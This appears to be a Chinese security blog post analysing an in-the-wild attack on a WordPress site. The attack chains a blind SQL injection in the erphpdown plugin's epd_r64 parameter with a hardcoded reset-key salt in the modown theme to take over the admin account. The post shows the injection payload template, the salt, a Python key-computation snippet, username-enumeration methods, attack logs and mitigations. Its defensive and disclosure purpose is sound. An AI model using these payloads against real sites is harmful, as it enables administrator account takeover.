---
title: 【微信】某WordPress付费插件严重漏洞在野攻击分析以及漏洞复现
source: https://mp.weixin.qq.com/s/PEWjFh9smIJY9TUr7D1XKw
source_host: mp.weixin.qq.com
clip_date: 2026-11-01T20:50:16+08:00
trace_id: 9dd892cb-ecb6-4404-90ca-e213d692a62a
content_hash: 1a4a0a00e913e17c0aa6f8fd9e5138cfd990ef6d2293a56c518e2ad2b6a27258
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 5
  succeeded: 5
  failed_urls: []
notion_page_id: 40b75244-d011-8191-9f29-e377bea5dd3f
ioc:
  cves: []
  cwes: []
  hashes:
    - 24998d4d6d2bb4aa2c5092d1754e4f3c
    - 24998d4d6d2bb4ba2c5092d1754e4f3c
  domains: []
  tools: []
  techniques: []
---

**七夜安全博客** *2026年11月1日 20:29*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4b83d9b64e81abc8.png)

好久没写安全分析类的文章了，这次也是把我搞的火大，我自己用了模板兔modown 主题 + erphpdown 插件搭建了一个小网站，也没啥重要信息，攻击者在利用漏洞的时候，一直给我发重置邮件，扰人休息，只能看看咋回事。

本来想假如有漏洞的话，直接升级一下就可以了，毕竟是付费版本，发现这个主题官网不知道啥时候停摆了，用这个主题的站长其实挺多，官方不维护，只能自己下场看看啥问题，维护一下。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b41e2c39fd3544a1.png)

下面整个攻击流程的分析，我都用example.com替代了，说实话用AI来排版真舒服，哈哈

## 一、摘要

| 项   | 内容  |
| :--- | :--- |
| 风险等级 | **严重（Critical）** |
| 最终影响 | 任意注册用户可重置管理员密码，完全接管站点 |
| 漏洞数量 | 2 个（1 个插件 SQL 注入 + 1 个主题密码重置逻辑缺陷） |
| 组合方式 | 注入读出 `user_activation_key` → 本地离线算出重置 key → 通过重置页改密 |
| 已知在野利用 | 2026-10-31 多个 IP 对该站反复改密，使用同一重置 key |

2026-10-31，多个来源 IP 对该站反复执行密码重置，并复用了同一个重置 key。日志显示攻击者全程使用 curl 直连，路径高度固定： `GET /wp-login.php` 触发找回 → `GET /login?action=reset_password&key=...&login=admin` 拿到有效重置表单 → `POST /wp-login.php` 改密。

攻击链一句话： **用 epd_r64 注入把数据库里 **`wp_users.user_activation_key`** 读出来，再按 modown 的公式 **md5(盐 + key)** 本地算出重置链接 key，就能合法走通重置密码流程。**

* * *

## 二、攻击链全貌

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1f5526ff298bea01.png)

两个关键事实：

1.  1\. **key 可读**： `user_activation_key` 存在 `wp_users` 表，且 erphpdown 插件存在可注入点，任何登录用户都能把它读出来。
    
2.  2\. **key 可算**：modown 重置校验用的是 md5(硬编码盐 + key)，盐是公开常量，攻击者离线即可算出合法重置 key。
    

### 2.1 获取管理员用户名的方式（攻击前置）

第 2 步"触发找回密码"是匿名开放接口，但要让系统为目标账号生成重置 key，必须先确定管理员用户名（或邮箱）。获取方式不限于默认 `admin` ，常见手段如下：

| 方式  | 手段  | 成本  | 说明  |
| :--- | :--- | :--- | :--- |
| ① 默认用户名 | 直接尝试 `admin` | 零成本 | 大量站点未修改默认用户名，可立即触发找回 |
| ② 作者枚举 | `GET /?author=1`<br><br>→ 302 跳转暴露登录名 | 低   | 逐个 `?author=N` 遍历可枚举全部注册用户 |
| ③ REST API | `GET /wp-json/wp/v2/users` | 低   | WordPress 默认暴露全部用户的登录名与 ID |
| ④ 找回响应差异 | `lostpassword`<br><br>对"用户名不存在/已发送"返回不同提示 | 低   | 逐个试探确认用户名是否真实存在 |
| ⑤ 邮箱触发 | 从备案、whois、联系页、文章作者处获取管理员邮箱 | 中   | `lostpassword`<br><br>支持填 `user_email` ，等价于用户名输入 |
| ⑥ SQL 注入直读 | epd_r64 盲注 `SELECT user_login FROM wp_users` | 依赖注入可用 | 无需任何外部信息直接读出用户名（本报告复现所用） |

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/eabc5d070daecd04.png)

路径说明：方式 ①②③④⑤ 仅需匿名访问即可完成；方式 ⑥ 依赖注入可用。任一路径拿到用户名后进入第 2 步，后续与上文攻击链一致：lostpassword/modown 写入新 key → 注入读出 → 离线算 reset_key → 重置页改密 → 接管。 **用户名本身不是利用的门槛，真正的门槛是注入是否可用。**

* * *

## 三、漏洞审计

### 3.1 漏洞 1：erphpdown epd_r64 SQL 注入

**文件**： `wp-content/plugins/erphpdown/includes/pay.erphp.php`

**入口函数 **`_epd_r64()`** （L420-427，挂 **`init`**，任意页面可触发）**：

```php
add_filter('init', '_epd_r64', 10);
function _epd_r64(){
    if(isset($_GET['epd_r64']) && $_GET['epd_r64']){
        ...
        global $wpdb;
        $epd_v64 = base64_decode($_GET['epd_r64']);      // ① 无过滤解码
        $epd_v64_arr = explode('-', $epd_v64);           // ② 按"-"切3段
        if(is_array($epd_v64_arr) && count($epd_v64_arr) == 3){
            $method = $epd_v64_arr[0];                    // ③ 第1段=支付方式=用户可控
            $price  = $epd_v64_arr[1];
            if(time()-$epd_v64_arr[2] > 60*30){          // ④ 第3段须为当前时间戳(30分钟内)
                wp_die("链接已过期！");
            }
            ...
            $epd_order = _epd_create_page_order($method, 'r', $price);  // ⑤ $method 直接传入
```

**SQL 拼接点（L407-408）**：

```bash
$sql="INSERT INTO $wpdb->icemoney (...,ice_alipay,...) VALUES
    (...,'$payment',...)";          // $payment = $method，未转义
$a=$wpdb->query($sql);
```

**成因**：

-   • `base64_decode` 后没有任何转义 / 过滤；
    
-   • 第 1 段 `$method` 原样传入 `_epd_create_page_order()` ，最终未转义拼接进 INSERT；
    
-   • 攻击者用 x',IF((条件),SLEEP(2),1),3,4)# 闭合引号、替换列值、 `#` 注释尾部，构成时间盲注。
    

**触发模板** （第 3 段时间戳必须实时生成）：

```
epd_r64 = base64("x',IF((条件),SLEEP(2),1),3,4)#-10-<当前unix时间戳>")
GET /?epd_r64=<URL编码后的base64>&ice_type=1
```

**登录检查**： `_epd_create_page_order()` 内有两次 "请先登录" 拦截（L27 无 post/type/ 未登录；L239 VIP 分支未开且未登录）。 **匿名请求会被 500 拦截，必须携带任意已登录用户的 Cookie 才能到达注入点** （本次复现已验证）。

### 3.2 漏洞 2：modown 主题密码重置逻辑缺陷

**文件**： `wp-content/themes/modown/action/login.php`

**生成 key（L199-205，** `action=password` **）**：向 `wp_users.user_activation_key` 写入随机 key，同时发找回邮件。

**校验并改密（L220-249，** `action=reset` **）**：

```swift
// 校验：md5($md5_str . user_activation_key) == 传入的 reset_key
if(md5($md5_str.$user_data->user_activation_key) == $reset_key){
    wp_set_password($new_password, $user_id);   // 直接改密
}
```

**关键缺陷**：

-   • 盐 `$md5_str` 默认硬编码 `M2O7B4A8N5T9U0` （后台选项 `login_password_key` 可覆盖，但多数站点未设置）；
    
-   • 重置 key 公式公开可算：重置key = md5(SALT + user_activation_key)；
    
-   • 只要攻击者能拿到 `user_activation_key` ，就能离线构造合法重置链接。
    

### 3.3 组合利用关系

| 步骤  | 利用点 | 产出  |
| :--- | :--- | :--- |
| 1   | 触发找回密码（主题或 WP 原生） | 数据库写入新 `user_activation_key` |
| 2   | erphpdown `epd_r64` 注入（时间盲注） | 读出 `user_activation_key` |
| 3   | 本地计算 `md5(SALT+key)` | 合法重置 key |
| 4   | `GET /login?action=reset_password&key=...&login=admin` | 通过校验，返回有效表单 |
| 5   | `POST action=reset`<br><br>提交新密码 | 管理员密码被改 |

* * *

## 四、攻击流程时间线（日志证据）

来源：全量日志 597 万条（example.com.log.tar.gz），攻击行为集中于 2026-10-31。

```
15:14  221.216.116.71   探测 epd_r64 注入点（information_schema 试探，多行子查询报错500）
17:17  114.254.2.211    POST /wp-content/themes/modown/action/login.php（触发找回密码）
21:19  39.144.79.232    带登录Cookie的盲注序列（IF(1=2) → 200 0B，时间盲注提取）
21:39  223.104.42.163   GET /login?action=reset_password&key=24998d4d6d2bb4aa2c5092d1754e4f3c&login=admin
                        → 200 3265B（有效重置表单）
21:39  223.104.42.163   POST /wp-login.php → 200 12096B（登录成功）
```

**关键事实**：

-   • 多个 IP（223.104.42.163/153、221.216.116.71、39.144.79.232、114.254.2.211、220.205.248.15、203.114.90.19）共用同一重置 key `24998d4d6d2bb4ba2c5092d1754e4f3c` 反复改密，说明攻击脚本共享、key 已公开流转；
    
-   • 重置页有效 / 无效可区分（真实 key → 200/3251B 含【设置新密码】表单；伪造 / 空 key → 200/2069B 无效），主题确实执行 md5(盐+user_activation_key) 比对。
    

* * *

## 五、复现方式（已验证）

### 5.1 前置条件

1.  1\. 站点存在未升级的 erphpdown 插件（ `pay.erphp.php` 含 407 行未转义拼接）；
    
2.  2\. **注册任意普通用户并登录**，取得 Cookie（ `wordpress_logged_in_*` 、 `PHPSESSID` ）—— 注入点要求登录态；
    
3.  3\. 目标： `wp_users.ID=1` （管理员 admin）。
    

### 5.2 注入点自检

```
IF((1=1),SLEEP(2),1) → 响应 ~2s（慢）
IF((1=2),SLEEP(2),1) → 响应 <1s（快）
```

慢 / 快差异 = 注入存在。

### 5.3 盲注提取（脚本 epd_r64_blind_extract.py）

```

python epd_r64_blind_extract.py `
  --cookie "wordpress_logged_in_xxx=值; PHPSESSID=值" `
  --where "ID=1" --length 64
```

脚本特性：

-   • 时间戳每次请求实时生成（满足 30 分钟窗口）；
    
-   • 自动 base64 + URL 编码；
    
-   • 注入点自检（ `--no-probe` 可跳过）；
    
-   • 二分提取 ASCII 32-126，逐字符 / 逐字段；
    
-   • 表 / 字段 / WHERE 全参数化，可提任意内容。
    

### 5.4 离线算重置 key

```
import hashlib
SALT = "M2O7B4A8N5T9U0"                      # 后台未设 login_password_key 时为默认盐
key  = "<提取出的 user_activation_key>"
reset_key = hashlib.md5((SALT + key).encode()).hexdigest()
print(reset_key)
```

### 5.5 验证（只到 "验证" 为止，不含改密）

```
GET /login?action=reset_password&key=<reset_key>&login=admin
→ 返回 200/3251B 且含【设置新密码】表单 = key 有效，攻击者视角的"合法重置链接"达成
```

复现脚本 **不包含** 实际提交新密码（POST action=reset），避免审计过程真正改密；日志攻击者最后一步为 POST 改密 + 登录。

* * *

## 六、调用关系

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5acdfd7ddf4584eb.png)

```bash
URL参数链：epd_r64 → base64_decode → explode('-')[:3] → [0]$method → _epd_create_page_order($method,'r',$price)
          → INSERT INTO {$wpdb->icemoney} VALUES(...,'$payment',...) → $wpdb->query($sql)
```

* * *

## 七、缓解方案（按优先级）

| 优先级 | 措施  | 说明  |
| :--- | :--- | :--- |
| P0  | **能停用就停用** | 已经不支持了能不用就不用这个主题了 |
| P0  | **后台设置 **`login_password_key`** 为随机长字符串** | 盐不再可预测，即使读到 key 也算不出重置 key（临时止血） |
| P1  | \*\*Nginx / 宝塔防火墙拦截 \*\* `epd_r64` | 已交付 `nginx_rules.conf` （加固版）： `epd_r64` / `author=` 枚举/xmlrpc/modown action 目录拦截、\`action=reset_password |
| P1  | **封堵主题前台接口** | `/wp-content/themes/modown/action/`<br><br>匿名访问一律 403； `/login?action=reset_password` 限流 |
| P1  | **全量轮换密码** | 管理员 + 疑似后门账号（已交付 `cleanup.sql` 加固版）；清空 `wp_users.user_activation_key` （本次攻击载体）与 `_password_reset_key` 、踢会话、清注入污染行 |
| P2  | **登录加固** |     |
| P2  | **数据库最小权限** | 站点库账号仅授权本库，禁用 root； `wp-config.php` 权限 600 |
| P2  | **监控告警** | 日志关键词： `epd_r64` 、 `action=reset_password` 、 `action=password` 、`?author=` ；宝塔 WAF 规则同步 |
| P3  | **禁用高危 PHP 函数** | `eval/system/exec/shell_exec/passthru/proc_open/popen`<br><br>等（宝塔 PHP 设置） |
| P3  | **定期备份与演练** | 每日备份数据库 + 网站；验证恢复流程 |

### 代码级修复示例（插件升级前临时补丁）

```php
// pay.erphp.php L407 原：
$sql="INSERT INTO $wpdb->icemoney (...,ice_alipay,...) VALUES (...,'$payment',...)";
// 改为参数化：
$wpdb->query($wpdb->prepare(
    "INSERT INTO $wpdb->icemoney (...,ice_alipay,...) VALUES (...,%s,...)",
    $payment
));
// 或最小改动：$payment = esc_sql($payment);
```

* * *

## 八、交付物清单

| 文件  | 用途  |
| :--- | :--- |
| epd_r64_blind_extract.py（不提供防止被扩大利用） |     |
| modown_reset_exploit.py(不提供防止扩大利用) | 完整复现链（触发找回→提取→算 key→验证） |
| `nginx_rules.conf` |     |
| `cleanup.sql` | 数据库清理（加固版）：清 user_activation_key（本次攻击载体）与 \_password_reset_key、踢会话、查后门账号、清注入污染行 |
|     |     |

加固方案，我放到这里了：https://pan.xunlei.com/s/VP5M-xWDrUJRlzI3vHvSo1wgA1?pwd=47tw#

渗透测试 · 目录
